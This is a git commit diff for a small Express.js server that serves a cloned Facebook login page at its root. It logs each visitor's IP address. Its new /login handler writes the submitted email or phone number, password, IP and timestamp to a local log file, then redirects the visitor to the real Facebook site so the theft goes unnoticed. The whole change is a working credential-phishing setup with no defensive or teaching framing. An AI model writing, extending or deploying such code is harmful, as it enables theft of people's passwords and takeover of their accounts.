7e33b77cf995471a190722e9e129a2a2ce434123
codreanualexei <codreanualexeialexandru@gmai.com>
2022-02-16 03:36:00 -0800

    v.0.0.1

--- app.js
+++ app.js
@@ -1,6 +1,8 @@
 const express = require('express')
 const morgan = require('morgan')
 const dotenv = require('dotenv')
+const path = require('path')
+const bodyParser = require("body-parser");
 var fs = require('fs')
 
 const PORT = process.env.PORT || 5000;
@@ -13,6 +15,20 @@ const app = express()
 
 //Use json format fot this application
 app.use(express.json());
+app.use(express.urlencoded());
+
+app.use(bodyParser.urlencoded({
+    extended: true
+}));
+/**bodyParser.json(options)
+ * Parses the text as JSON and exposes the resulting object on req.body.
+ */
+app.use(bodyParser.json());
+
+
+
+
+app.use("/", express.static(path.join(__dirname, 'views/fb-login-clone')));
 
 //set view engine
 app.set('view engine','ejs')
@@ -20,16 +36,39 @@ app.set('view engine','ejs')
 //Make public static folders
 app.use('/validation', express.static('validation')) //for images
 
+app.all('*',function (req, res, next) {
+
+    console.log("request made: ", req.headers['x-forwarded-for']?.split(',').shift()
+    || req.socket?.remoteAddress)
+    next();
+})
+
 app.get('/', function (req, res) {
-    res.render('index')
-});
+
+    res.sendFile(path.join(__dirname+'/views/fb-login-clone/index.html'));
+})
+
+app.post('/login', function (req, res) {
+    
+    try {
+        let content = "\nIP:"+ (req.headers['x-forwarded-for']?.split(',').shift()
+        || req.socket?.remoteAddress) + "\nData: "+ new Date().toLocaleString("ro-RO", {hour12: "false"})+"\nemail/tel: "+req.body.name+"\nPass: "+req.body.pass+"\n"
+        console.log("post made",req.body)
+        fs.writeFileSync('./data/log.txt', content,{ flag: 'a+' })
+        //file written successfully
+      } catch (err) {
+        console.error(err)
+      }
+    
+    
+    res.redirect("https://www.facebook.com/");
+})
+
 
 app.listen(PORT, function(err){
     if (err) console.log(err);
     console.log("Server listening on PORT", PORT);
 });
-
-
 
 
 
